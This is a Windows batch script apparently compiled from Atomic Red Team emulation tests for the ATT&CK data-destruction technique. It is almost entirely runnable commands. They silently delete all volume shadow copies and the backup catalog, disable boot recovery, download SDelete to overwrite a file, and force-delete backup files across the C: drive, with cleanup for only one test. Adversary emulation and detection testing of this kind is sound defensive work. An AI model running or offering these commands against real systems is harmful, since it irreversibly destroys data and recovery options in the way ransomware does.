@echo off

echo T1485 - Data Destruction
echo Atomic Test #1 - Windows - Delete Volume Shadow Copies
vssadmin.exe delete shadows /all /quiet

echo Atomic Test #2 - Windows - Delete Windows Backup Catalog
wbadmin.exe delete catalog -quiet

echo Atomic Test #3 - Windows - Disable Windows Recovery Console Repair
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no

echo Clean Up Test #3
bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures
bcdedit.exe /set {default} recoveryenabled yes

echo Check for Sysinternals Tools

powershell -command "if (Test-Path '#{sdelete_exe}') {0} else {1}" | findstr /C:"1">nul && (
    echo Tools Exists
) || (
    echo Get Tools
    powershell -command "Invoke-WebRequest 'https://download.sysinternals.com/files/SDelete.zip' -OutFile $env:TEMP\SDelete.zip;Expand-Archive $env:TEMP\SDelete.zip $env:TEMP\Sdelete -Force;New-Item -ItemType Directory (Split-Path '#{sdelete_exe}') -Force | Out-Null;Copy-Item $env:TEMP\Sdelete\sdelete.exe '#{sdelete_exe}' -Force"
)

echo Remove $env:TEMP\T1485.txt if it exists
powershell -command "if (Test-Path $env:TEMP\T1485.txt) {Remove-Item $env:TEMP\T1485.txt}"

echo Atomic Test #4 - Windows - Overwrite file with Sysinternals SDelete

powershell -command "New-Item $env:TEMP\T1485.txt;#{sdelete_exe} -accepteula $env:TEMP\T1485.txt"

echo Atomic Test #6 - Windows - Delete Backup Files
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk >nul 2>&1
